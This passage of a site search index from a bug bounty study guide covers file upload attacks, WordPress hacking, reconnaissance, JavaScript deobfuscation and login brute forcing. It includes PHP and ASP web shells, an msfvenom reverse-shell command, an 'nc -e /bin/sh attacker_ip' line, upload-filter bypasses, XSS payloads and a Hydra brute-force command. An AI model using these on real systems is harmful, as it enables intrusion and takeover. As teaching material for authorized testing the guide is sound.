</ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#6-bypass-blacklist-based-validation","title":"6. Bypass Blacklist-Based Validation","text":"<ul> <li>Explanation: Try uncommon extensions (<code>phtml</code>, <code>php3</code>), case variations (<code>pHp</code>), or double extensions (<code>shell.php.jpg</code>) to evade extension blacklists.</li> <li>Why It's Done: Blacklists are often incomplete or poorly implemented, allowing malicious files through.</li> <li>Example: Upload <code>shell.phtml</code> if <code>.php</code> is blocked but <code>.phtml</code> is not.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#7-bypass-whitelist-or-content-validation","title":"7. Bypass Whitelist or Content Validation","text":"<ul> <li>Explanation: Use polyglots (files valid as both image and code), null bytes (<code>shell.php%00.jpg</code>), or inject characters (<code>%20</code>, <code>%0a</code>) to trick validation.</li> <li>Why It's Done: Whitelists or content checks may miss edge cases, enabling execution.</li> <li>Example: Create a JPEG with PHP code in metadata using ExifTool, upload as <code>image.jpg</code>.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#8-test-for-race-conditions","title":"8. Test for Race Conditions","text":"<ul> <li>Explanation: Rapidly upload files to exploit temporary file storage before validation or deletion.</li> <li>Why It's Done: Race conditions can allow access to files before they\u2019re removed.</li> <li>Example: Fuzz temporary file names like <code>/tmp/phpXXXXXX</code> during upload.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#9-test-client-side-attacks","title":"9. Test Client-Side Attacks","text":"<ul> <li>Explanation: Upload files triggering client-side vulns, like SVG with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> for XSS or XML with XXE payloads.</li> <li>Why It's Done: If RCE is blocked, client-side attacks still have impact.</li> <li>Example: Upload <code>malicious.svg</code> with <code>&lt;svg onload=alert(1)&gt;</code> and access it.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#10-escalate-to-rce-or-other-impacts","title":"10. Escalate to RCE or Other Impacts","text":"<ul> <li>Explanation: If a file executes, use it for RCE (e.g., reverse shell via <code>msfvenom -p php/reverse_php</code>). Chain with LFI for further exploitation.</li> <li>Why It's Done: Maximizes impact, turning upload into full system access.</li> <li>Example: Upload <code>shell.php</code>, access <code>/uploads/shell.php?cmd=nc -e /bin/sh attacker_ip 9001</code>.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#11-assess-prevention-measures","title":"11. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for strong validation (whitelists, content checks), random file names, or non-executable upload directories.</li> <li>Why It's Done: Informs remediation, like storing files outside web root or disabling script execution.</li> <li>Example: Secure app renames files to random UUIDs and serves as <code>Content-Type: application/octet-stream</code>.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a thorough process for testing file upload vulnerabilities. Test ethically and report responsibly.</p>"},{"location":"bug-bounty-guide/file-upload-cheat/","title":"File Upload Attacks Cheat Sheet","text":""},{"location":"bug-bounty-guide/file-upload-cheat/#web-shells","title":"Web Shells","text":"Web Shell Description <code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code> Basic PHP File Read <code>&lt;?php system('hostname'); ?&gt;</code> Basic PHP Command Execution <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code> Basic PHP Web Shell <code>&lt;% eval request('cmd') %&gt;</code> Basic ASP Web Shell <code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code> Generate PHP reverse shell PHP Web Shell PHP Web Shell PHP Reverse Shell PHP Reverse Shell Web/Reverse Shells List of Web Shells and Reverse Shells"},{"location":"bug-bounty-guide/file-upload-cheat/#bypasses","title":"Bypasses","text":"Command Description Client-Side Bypass <code>[CTRL+SHIFT+C]</code> Toggle Page Inspector Blacklist Bypass <code>shell.phtml</code> Uncommon Extension <code>shell.pHp</code> Case Manipulation PHP Extensions List of PHP Extensions ASP Extensions List of ASP Extensions Web Extensions List of Web Extensions Whitelist Bypass <code>shell.jpg.php</code> Double Extension <code>shell.php.jpg</code> Reverse Double Extension <code>%20, %0a, %00, %0d0a, /, .\\, ., \u2026</code> Character Injection - Before/After Extension Content/Type Bypass Content-Types List of All Content-Types File Signatures List of File Signatures/Magic Bytes"},{"location":"bug-bounty-guide/file-upload-cheat/#limited-uploads","title":"Limited Uploads","text":"Potential Attack File Types XSS HTML, JS, SVG, GIF XXE/SSRF XML, SVG, PDF, PPT, DOC DoS ZIP, JPG, PNG"},{"location":"bug-bounty-guide/hacking-wordpress-guide/","title":"Hacking WordPress","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#step-by-step-guide-for-testing-and-exploiting-wordpress-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting WordPress Vulnerabilities","text":""},{"location":"bug-bounty-guide/hacking-wordpress-guide/#1-understand-wordpress-structure","title":"1. Understand WordPress Structure","text":"<ul> <li>Explanation: WordPress is a CMS with a core, plugins, themes, and user roles (admin, editor, subscriber). Vulnerabilities often stem from outdated components, misconfigurations, or weak authentication.</li> <li>Why It's Done: Mapping the structure (e.g., directories, user roles) identifies attack surfaces like vulnerable plugins or exposed admin panels.</li> <li>Example: Use <code>tree -L 1</code> to list directories like <code>/wp-content/plugins/</code>.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#2-enumerate-wordpress-version-and-components","title":"2. Enumerate WordPress Version and Components","text":"<ul> <li>Explanation: Check the <code>&lt;meta name=\"generator\"&gt;</code> tag, README files, or HTTP headers for core, plugin, and theme versions. Use <code>wpscan --url site -e vp,vt</code> for automated enumeration.</li> <li>Why It's Done: Outdated versions often have known CVEs, making them prime targets.</li> <li>Example: <code>&lt;meta name=\"generator\" content=\"WordPress 5.4.2\"&gt;</code> indicates an old, potentially vulnerable version.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#3-enumerate-users","title":"3. Enumerate Users","text":"<ul> <li>Explanation: Use <code>wpscan --url site -e u</code> or check <code>/author/1</code> or <code>/wp-json/wp/v2/users</code> to list usernames.</li> <li>Why It's Done: Valid usernames enable targeted brute forcing or social engineering.</li> <li>Example: Accessing <code>/author/admin</code> reveals the username <code>admin</code>.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#4-brute-force-login-credentials","title":"4. Brute Force Login Credentials","text":"<ul> <li>Explanation: Use <code>wpscan --url site --usernames users.txt --passwords pass.txt</code> or Hydra to brute force <code>/wp-login.php</code> or <code>/xmlrpc.php</code>.</li> <li>Why It's Done: Weak passwords or default credentials (e.g., admin:admin) grant access.</li> <li>Example: <code>hydra -l admin -P passwords.txt http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=incorrect\"</code>.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#5-exploit-vulnerable-plugins-or-themes","title":"5. Exploit Vulnerable Plugins or Themes","text":"<ul> <li>Explanation: Search Exploit-DB or WPScan Vulnerability Database for CVEs in enumerated plugins/themes, then test exploits like SQLi or file upload.</li> <li>Why It's Done: Plugins/themes are common entry points for RCE or data leaks.</li> <li>Example: Exploit a file upload vuln in an outdated slider plugin to upload a shell.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#6-test-xml-rpc-vulnerabilities","title":"6. Test XML-RPC Vulnerabilities","text":"<ul> <li>Explanation: Target <code>/xmlrpc.php</code> for methods like <code>wp.getUsersBlogs</code> or <code>pingback.ping</code>, which can enable brute forcing or DDoS.</li> <li>Why It's Done: XML-RPC is often enabled and poorly secured, allowing attacks.</li> <li>Example: Use Metasploit\u2019s <code>wordpress_xmlrpc_login</code> to brute force credentials.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#7-gain-rce-via-theme-editor","title":"7. Gain RCE via Theme Editor","text":"<ul> <li>Explanation: If admin access is gained, edit theme files (Appearance &gt; Theme Editor) to insert malicious code (e.g., <code>&lt;?php system($_GET['cmd']); ?&gt;</code>).</li> <li>Why It's Done: Provides persistent RCE without relying on plugins.</li> <li>Example: Add PHP shell to <code>404.php</code> and access <code>/wp-content/themes/theme/404.php?cmd=id</code>.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#8-use-metasploit-for-automated-exploits","title":"8. Use Metasploit for Automated Exploits","text":"<ul> <li>Explanation: Load Metasploit modules like <code>wordpress_xmlrpc_brute</code> or <code>wordpress_plugin_upload</code> to automate attacks.</li> <li>Why It's Done: Simplifies complex exploits like multi-step RCE.</li> <li>Example: <code>msfconsole -x \"use wordpress_xmlrpc_login; set RHOSTS site; run\"</code>.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#9-test-directory-indexing-and-misconfigurations","title":"9. Test Directory Indexing and Misconfigurations","text":"<ul> <li>Explanation: Check for directory listing (<code>/wp-content/uploads/</code>) or exposed configs (<code>wp-config.php</code>).</li> <li>Why It's Done: Reveals sensitive files or database credentials.</li> <li>Example: Access <code>/wp-content/plugins/</code> to find misconfigured plugins.</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for security plugins (e.g., Wordfence), disabled XML-RPC, updated components, and strong passwords.</li> <li>Why It's Done: Informs remediation, like disabling XML-RPC or enforcing updates.</li> <li>Example: Secure app uses <code>.htaccess</code> to block <code>/xmlrpc.php</code> access.</li> </ul> <p>This guide, based on HackTricks, OWASP, and the provided cheat sheet, equips hunters to test WordPress vulnerabilities effectively. Always test within program scope.</p>"},{"location":"bug-bounty-guide/info-gathering-cheat/","title":"Information Gathering - Web Edition Cheat Sheet","text":"<p>Web reconnaissance is the first step in any security assessment or penetration testing engagement. It's akin to a detective's initial investigation, meticulously gathering clues and evidence about a target before formulating a plan of action. In the digital realm, this translates to accumulating information about a website or web application to identify potential vulnerabilities, security misconfigurations, and valuable assets.</p>"},{"location":"bug-bounty-guide/info-gathering-cheat/#goals-of-web-reconnaissance","title":"Goals of Web Reconnaissance","text":"<p>The primary goals of web reconnaissance revolve around gaining a comprehensive understanding of the target's digital footprint. This includes:</p> <ul> <li>Identifying Assets: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.</li> <li>Uncovering Hidden Information: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.</li> <li>Analyzing the Attack Surface: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.</li> <li>Gathering Intelligence: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.</li> </ul>"},{"location":"bug-bounty-guide/info-gathering-cheat/#reconnaissance-types","title":"Reconnaissance Types","text":"Type Description Risk of Detection Examples Active Reconnaissance Involves directly interacting with the target system, such as sending probes or requests. Higher Port scanning, vulnerability scanning, network mapping Passive Reconnaissance Gathers information without directly interacting with the target, relying on publicly available data. Lower Search engine queries, WHOIS lookups, DNS enumeration, web archive analysis, social media"},{"location":"bug-bounty-guide/info-gathering-cheat/#whois","title":"WHOIS","text":"<p>WHOIS is a query and response protocol used to retrieve information about domain names, IP addresses, and other internet resources. It's essentially a directory service that details who owns a domain, when it was registered, contact information, and more. In the context of web reconnaissance, WHOIS lookups can be a valuable source of information, potentially revealing the identity of the website owner, their contact information, and other details that could be used for further investigation or social engineering attacks.</p> <p>For example, to find out who owns the domain example.com:</p> <pre><code>whois example.com\n</code></pre> <p>Note: WHOIS data can be inaccurate or intentionally obscured, so verify from multiple sources. Privacy services may mask the true owner.</p>"},{"location":"bug-bounty-guide/info-gathering-cheat/#dns","title":"DNS","text":"<p>The Domain Name System (DNS) functions as the internet's GPS, translating user-friendly domain names into numerical IP addresses. DNS ensures your browser reaches the correct website by matching its name with its IP address.</p> <p>The <code>dig</code> command queries DNS servers directly. For example, to find the IP address for example.com:</p> <pre><code>dig example.com A\n</code></pre> <p>This retrieves the A record (hostname to IPv4 address). The output includes the IP address and query details.</p>"},{"location":"bug-bounty-guide/info-gathering-cheat/#dns-record-types","title":"DNS Record Types","text":"Record Type Description A Maps a hostname to an IPv4 address. AAAA Maps a hostname to an IPv6 address. CNAME Creates an alias for a hostname, pointing it to another hostname. MX Specifies mail servers responsible for handling email for the domain. NS Delegates a DNS zone to a specific authoritative name server. TXT Stores arbitrary text information. SOA Contains administrative information about a DNS zone."},{"location":"bug-bounty-guide/info-gathering-cheat/#subdomains","title":"Subdomains","text":"<p>Subdomains are extensions of a primary domain name, used to organize sections or services (e.g., <code>mail.example.com</code>, <code>blog.example.com</code>). They can expose additional attack surfaces or hidden services.</p>"},{"location":"bug-bounty-guide/info-gathering-cheat/#subdomain-enumeration-approaches","title":"Subdomain Enumeration Approaches","text":"Approach Description Examples Active Enumeration Directly interacts with the target's DNS servers or uses tools to probe for subdomains. Brute-forcing, DNS zone transfers Passive Enumeration Collects information without direct interaction, relying on public sources. Certificate Transparency (CT) logs, search engine queries"},{"location":"bug-bounty-guide/info-gathering-cheat/#subdomain-brute-forcing","title":"Subdomain Brute-Forcing","text":"<p>Subdomain brute-forcing uncovers hidden subdomains by testing potential names against the target's DNS server. Use <code>dnsenum</code> with a wordlist:</p> <pre><code>dnsenum example.com -f subdomains.txt\n</code></pre>"},{"location":"bug-bounty-guide/info-gathering-cheat/#zone-transfers","title":"Zone Transfers","text":"<p>DNS zone transfers (AXFR) replicate DNS data across servers, potentially exposing subdomains, IPs, and records. Attempt with:</p> <pre><code>dig @ns1.example.com example.com axfr\n</code></pre> <p>Note: Many DNS servers restrict zone transfers to authorized servers.</p>"},{"location":"bug-bounty-guide/info-gathering-cheat/#virtual-hosts","title":"Virtual Hosts","text":"<p>Virtual hosting allows multiple websites to share one IP address. Use <code>gobuster</code> to enumerate virtual hosts:</p> <pre><code>gobuster vhost -u http://192.0.2.1 -w hostnames.txt\n</code></pre>"},{"location":"bug-bounty-guide/info-gathering-cheat/#certificate-transparency-ct-logs","title":"Certificate Transparency (CT) Logs","text":"<p>CT logs record SSL/TLS certificates, revealing subdomains. Query with:</p> <pre><code>curl -s \"https://crt.sh/?q=%25.example.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n</code></pre>"},{"location":"bug-bounty-guide/info-gathering-cheat/#web-crawling","title":"Web Crawling","text":"<p>Web crawling maps a website's structure by following links. Analyze <code>robots.txt</code> for hidden directories. Use Scrapy for crawling:</p> <pre><code>import scrapy\n\nclass ExampleSpider(scrapy.Spider):\n    name = \"example\"\n    start_urls = ['http://example.com/']\n\n    def parse(self, response):\n        for link in response.css('a::attr(href)').getall():\n            if any(link.endswith(ext) for ext in self.interesting_extensions):\n                yield {\"file\": link}\n            elif not link.startswith(\"#\") and not link.startswith(\"mailto:\"):\n                yield response.follow(link, callback=self.parse)\n</code></pre> <p>Extract links:</p> <pre><code>jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u\n</code></pre>"},{"location":"bug-bounty-guide/info-gathering-cheat/#search-engine-discovery","title":"Search Engine Discovery","text":"<p>Use search operators for OSINT:</p> Operator Description Example <code>site:</code> Restricts results to a website. <code>site:example.com \"password reset\"</code> <code>inurl:</code> Searches for a term in the URL. <code>inurl:admin login</code> <code>filetype:</code> Limits results to file types. <code>filetype:pdf \"confidential report\"</code> <code>intitle:</code> Searches for a term in the page title. <code>intitle:\"index of\" /backup</code> <code>cache:</code> Shows cached webpage. <code>cache:example.com</code> <code>\"search term\"</code> Exact phrase search. <code>\"internal error\" site:example.com</code> <code>OR</code> Combines terms. <code>inurl:admin OR inurl:login</code> <code>-</code> Excludes terms. <code>inurl:admin -intext:wordpress</code>"},{"location":"bug-bounty-guide/info-gathering-cheat/#web-archives","title":"Web Archives","text":"<p>Web archives like the Wayback Machine store historical website snapshots:</p> Feature Description Use Case in Reconnaissance Historical Snapshots View past versions of websites. Identify past content or functionality. Hidden Directories Explore removed or hidden directories. Discover sensitive information or backups. Content Changes Track changes in content. Assess security posture evolution."},{"location":"bug-bounty-guide/info-gathering-cheat/#nmap-scans","title":"Nmap Scans","text":""},{"location":"bug-bounty-guide/info-gathering-cheat/#scan-types","title":"Scan Types","text":"<p>Common Nmap scan types and flags with examples:</p> Scan Type Description Flag TCP SYN Scan Stealthy half-open scan for TCP ports. Example: <code>nmap -sS -T4 192.168.1.1</code> -sS TCP Connect Scan Full TCP connection scan. Example: <code>nmap -sT -p 1-1000 192.168.1.1</code> -sT UDP Scan Scan for UDP ports. Example: <code>nmap -sU -sV 192.168.1.1</code> -sU Ping Scan Host discovery without port scanning. Example: <code>nmap -sn 192.168.1.0/24</code> -sn (or -sP) Version Detection Identify service versions on open ports. Example: <code>nmap -sV -p 80,443 192.168.1.1</code> -sV OS Detection Fingerprint operating system. Example: <code>nmap -O 192.168.1.1</code> -O Script Scan Run NSE scripts for additional info. Example: <code>nmap -sC 192.168.1.1</code> -sC Aggressive Scan Combines version, OS, script, and traceroute. Example: <code>nmap -A 192.168.1.1</code> -A Idle/Zombie Scan Stealth scan using spoofed IP. Example: <code>nmap -sI zombie.host 192.168.1.1</code> -sI"},{"location":"bug-bounty-guide/info-gathering-cheat/#commonly-used-nmap-flags","title":"Commonly Used Nmap Flags","text":"<p>Additional flags to customize Nmap scans:</p> Flag Purpose <code>-p</code> Defines a port range or specific ports to scan (e.g., <code>-p 1-1000</code> for ports 1-1000, <code>-p 80,443</code> for specific ports). <code>-T&lt;0-5&gt;</code> Sets timing template (0=paranoid to 5=insane) to control scan speed (e.g., <code>-T4</code> for faster scans). <code>-A</code> Enables aggressive scan features (version detection, OS detection, scripting, traceroute). <code>-oN</code> Outputs scan results to a normal file (e.g., <code>-oN scan.txt</code>). <code>-v</code> Increases verbosity for detailed output during the scan. <code>-Pn</code> Treats all hosts as online, skipping host discovery (useful for firewalls). <code>-iL</code> Reads targets from a file (e.g., <code>-iL targets.txt</code> for a list of IPs)."},{"location":"bug-bounty-guide/information-gathering-guide/","title":"Information Gathering","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/information-gathering-guide/#step-by-step-guide-for-information-gathering-in-bug-bounty-hunting","title":"Step-by-Step Guide for Information Gathering in Bug Bounty Hunting","text":""},{"location":"bug-bounty-guide/information-gathering-guide/#1-understand-the-importance-of-information-gathering","title":"1. Understand the Importance of Information Gathering","text":"<ul> <li>Explanation: Information gathering, or reconnaissance, involves collecting data about the target application, its infrastructure, and potential entry points without directly interacting in a harmful way. This phase includes passive (using public sources) and active (probing the target) methods to build a profile of the target's attack surface.</li> <li>Why It's Done: A thorough recon phase reveals subdomains, technologies, and misconfigurations that could lead to vulnerabilities. It maximizes efficiency by focusing testing on high-value areas and minimizes detection risk during early stages.</li> <li>Example: Discovering a forgotten subdomain hosting an outdated CMS could lead to an easy exploit.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#2-define-the-scope","title":"2. Define the Scope","text":"<ul> <li>Explanation: Review the bug bounty program's rules to identify in-scope domains, IPs, and assets. Note out-of-scope items to avoid violations.</li> <li>Why It's Done: Ensures testing stays legal and focused, preventing wasted effort on irrelevant areas.</li> <li>Example: If the scope is <code>*.example.com</code>, prioritize subdomains like <code>api.example.com</code>.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#3-perform-passive-reconnaissance","title":"3. Perform Passive Reconnaissance","text":"<ul> <li>Explanation: Use public sources to gather info without touching the target. This includes WHOIS lookups for domain registration details, DNS queries for records (A, MX, NS), and search engines with dorks (e.g., <code>site:example.com filetype:pdf</code>) for sensitive files.</li> <li>Why It's Done: Passive recon is stealthy, reducing the chance of alerting the target, and often reveals valuable data like emails or old configs.</li> <li>Example: Run <code>whois example.com</code> to get owner contacts, or <code>dig example.com NS</code> for nameservers.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#4-enumerate-subdomains-passively","title":"4. Enumerate Subdomains Passively","text":"<ul> <li>Explanation: Query Certificate Transparency (CT) logs via crt.sh or search engines for subdomains listed in certificates.</li> <li>Why It's Done: Subdomains may host vulnerable services or forgotten apps; passive methods avoid direct queries to the target's DNS.</li> <li>Example: <code>curl -s \"https://crt.sh/?q=%25.example.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u</code> to list unique subdomains.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#5-enumerate-subdomains-actively","title":"5. Enumerate Subdomains Actively","text":"<ul> <li>Explanation: Use tools like dnsenum for brute-forcing with wordlists or attempt zone transfers (<code>dig @ns.example.com example.com axfr</code>).</li> <li>Why It's Done: Active methods uncover subdomains not in public logs, but carry detection risk; use sparingly.</li> <li>Example: <code>dnsenum example.com -f subdomains.txt</code> to brute-force common names.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#6-discover-virtual-hosts","title":"6. Discover Virtual Hosts","text":"<ul> <li>Explanation: Fuzz the Host header with tools like gobuster (<code>gobuster vhost -u http://ip -w hostnames.txt</code>) to find multiple sites on the same IP.</li> <li>Why It's Done: Virtual hosts may have different security levels; one could be vulnerable.</li> <li>Example: Discovering <code>admin.example.com</code> on the main IP.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#7-crawl-the-website","title":"7. Crawl the Website","text":"<ul> <li>Explanation: Use spiders like Scrapy or ZAP to follow links, mapping directories and files. Check <code>robots.txt</code> for disallowed paths.</li> <li>Why It's Done: Reveals hidden directories, parameters, or old files that could be exploited.</li> <li>Example: Set up a Scrapy spider to extract links and analyze for sensitive extensions like <code>.bak</code>.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#8-use-search-engine-discovery","title":"8. Use Search Engine Discovery","text":"<ul> <li>Explanation: Apply Google Dorks (e.g., <code>inurl:admin site:example.com</code>) or Bing for exposed files, directories, or errors.</li> <li>Why It's Done: Search engines index data the app might not intend to expose, like backups or login pages.</li> <li>Example: <code>intitle:\"index of\" /backup site:example.com</code> to find directory listings.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#9-check-web-archives","title":"9. Check Web Archives","text":"<ul> <li>Explanation: Use Wayback Machine or similar to view historical snapshots for removed content or configs.</li> <li>Why It's Done: Old versions may reveal vulnerabilities fixed in current but exploitable via other means.</li> <li>Example: Search Wayback for <code>example.com/wp-config.php</code> exposing DB creds in past snapshots.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#10-analyze-and-prioritize-findings","title":"10. Analyze and Prioritize Findings","text":"<ul> <li>Explanation: Compile data on subdomains, tech stack (e.g., from headers), and potential weak points. Prioritize based on sensitivity (e.g., admin subdomains).</li> <li>Why It's Done: Organizes recon for efficient vulnerability scanning in later stages.</li> <li>Example: List subdomains with Wappalyzer to identify outdated tech like old WordPress.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-guide/#11-assess-prevention-measures","title":"11. Assess Prevention Measures","text":"<ul> <li>Explanation: Note if the target hides info (e.g., redacted WHOIS) or blocks crawlers.</li> <li>Why It's Done: Helps in reporting and understanding security posture.</li> <li>Example: If zone transfers are blocked, note as a good practice.</li> </ul> <p>This guide, based on the Information Gathering - Web Edition module and aligned with PortSwigger Web Security Academy, provides a detailed process for recon. Test ethically within scope.</p>"},{"location":"bug-bounty-guide/introduction-to-web-applications/","title":"Introduction to Web Applications","text":""},{"location":"bug-bounty-guide/introduction-to-web-applications/#overview","title":"Overview","text":"<p>Web applications are software programs accessed via a web browser, typically built with a client-server architecture.</p>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#web-application-layout","title":"Web Application Layout","text":"<ul> <li>Front-End: Includes HTML for structure, CSS for styling, and JavaScript for interactivity, running in the browser.</li> <li>Back-End: Comprises servers (e.g., Apache, Nginx), databases (e.g., MySQL, MongoDB), and APIs handling logic and data.</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#front-end-vs-back-end","title":"Front-End vs. Back-End","text":"<ul> <li>Front-End: User-facing, dynamic with JavaScript (e.g., React, Vue). Vulnerable to XSS or client-side injection.</li> <li>Back-End: Server-side, manages data and requests. Susceptible to SQLi or server misconfigs.</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#key-technologies","title":"Key Technologies","text":"<ul> <li>HTML: Defines content and structure.</li> <li>CSS: Controls presentation.</li> <li>JavaScript: Adds interactivity (e.g., form validation).</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#sensitive-data-exposure","title":"Sensitive Data Exposure","text":"<p>Risk of leaking credentials or keys if not encrypted or if source code is exposed.</p>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#common-vulnerabilities","title":"Common Vulnerabilities","text":"<ul> <li>HTML Injection: Unsanitized input renders as HTML.</li> <li>XSS: Malicious scripts execute in users\u2019 browsers.</li> <li>CSRF: Unauthorized actions via forged requests.</li> <li>Back-End Issues: Misconfigured servers or vulnerable APIs.</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#tools","title":"Tools","text":"<ul> <li>Browser DevTools ([CTRL+SHIFT+I]) for front-end analysis.</li> <li>Burp Suite for backend traffic inspection.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/","title":"JavaScript Deobfuscation","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#overview","title":"Overview","text":"<p>JavaScript deobfuscation involves reversing the process of making code unreadable to uncover its original logic, often used to identify vulnerabilities like XSS or hidden API calls.</p>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#source-code","title":"Source Code","text":"<ul> <li>Types: Minified, encoded (base64, hex), or packed with tools like UglifyJS.</li> <li>Purpose: Protects intellectual property but can hide malicious intent.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#code-obfuscation","title":"Code Obfuscation","text":"<ul> <li>Basic: Renaming variables, removing whitespace.</li> <li>Advanced: String encryption, control flow flattening.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#deobfuscation-process","title":"Deobfuscation Process","text":"<ul> <li>Manual: Analyze with browser DevTools (Ctrl+Shift+I).</li> <li>Automated: Use online tools to beautify and decode.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#tools-and-websites","title":"Tools and Websites","text":"<ul> <li>Prettier (https://prettier.io/): Formats code for readability.</li> <li>Beautifier (http://jsbeautifier.org/): Unminifies JavaScript.</li> <li>JSNice (http://jsnice.org/): Infers variable names.</li> <li>JS Console: Built-in browser tool for step-through debugging.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#code-analysis","title":"Code Analysis","text":"<ul> <li>Focus: Look for DOM manipulation (e.g., <code>innerHTML</code> for XSS), HTTP requests (e.g., <code>fetch</code> for SSRF), or eval() usage.</li> <li>Technique: Step through with breakpoints to observe execution.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#http-requests","title":"HTTP Requests","text":"<ul> <li>Inspection: Decode requests in obfuscated code to find endpoints or parameters.</li> <li>Exploit: Modify requests to test for injection or bypass.</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/#decoding-techniques","title":"Decoding Techniques","text":"<ul> <li>Base64: Use <code>echo \"encoded\" | base64 -d</code>.</li> <li>Hex: Convert with <code>xxd -r -p</code>.</li> <li>Rot13: Apply <code>tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>.</li> </ul> <p>This guide leverages knowledge from JavaScript security practices and online resources, aiding in vulnerability discovery.</p>"},{"location":"bug-bounty-guide/js-deobfuscation-cheat/","title":"JavaScript Deobfuscation Cheat Sheet","text":""},{"location":"bug-bounty-guide/js-deobfuscation-cheat/#commands","title":"Commands","text":"Command Description <code>curl http:/SERVER_IP:PORT/</code> cURL GET request <code>curl -s http:/SERVER_IP:PORT/ -X POST</code> cURL POST request <code>curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\"</code> cURL POST request with data <code>echo hackthebox | base64</code> base64 encode <code>echo ENCODED_B64 | base64 -d</code> base64 decode <code>echo hackthebox | xxd -p</code> hex encode <code>echo ENCODED_HEX | xxd -p -r</code> hex decode <code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 encode <code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 decode"},{"location":"bug-bounty-guide/js-deobfuscation-cheat/#deobfuscation-websites","title":"Deobfuscation Websites","text":"<ul> <li>JS Console</li> <li>Prettier</li> <li>Beautifier</li> <li>JSNice</li> </ul>"},{"location":"bug-bounty-guide/js-deobfuscation-cheat/#misc","title":"Misc","text":"Command Description <code>ctrl+u</code> Show HTML source code in Firefox"},{"location":"bug-bounty-guide/login-brute-forcing-guide/","title":"Login Brute Forcing","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#step-by-step-guide-for-testing-and-exploiting-login-brute-forcing-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting Login Brute Forcing Vulnerabilities","text":""},{"location":"bug-bounty-guide/login-brute-forcing-guide/#1-understand-brute-forcing-in-authentication-contexts","title":"1. Understand Brute Forcing in Authentication Contexts","text":"<ul> <li>Explanation: Brute forcing involves systematically guessing credentials, tokens, or PINs to bypass authentication, exploiting weak passwords, predictable tokens, or absent rate limits. It can target logins, password resets, or \"remember me\" features.</li> <li>Why It's Done: Understanding the attack surface (e.g., login forms, reset tokens) helps identify weak points where brute forcing is feasible.</li> <li>Example: A login form with no CAPTCHA or lockout allows unlimited password guesses.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#2-identify-target-authentication-points","title":"2. Identify Target Authentication Points","text":"<ul> <li>Explanation: Locate login forms, password reset endpoints, 2FA fields, or \"remember me\" cookies using Burp Suite or browser DevTools.</li> <li>Why It's Done: These are the entry points for brute force attacks; 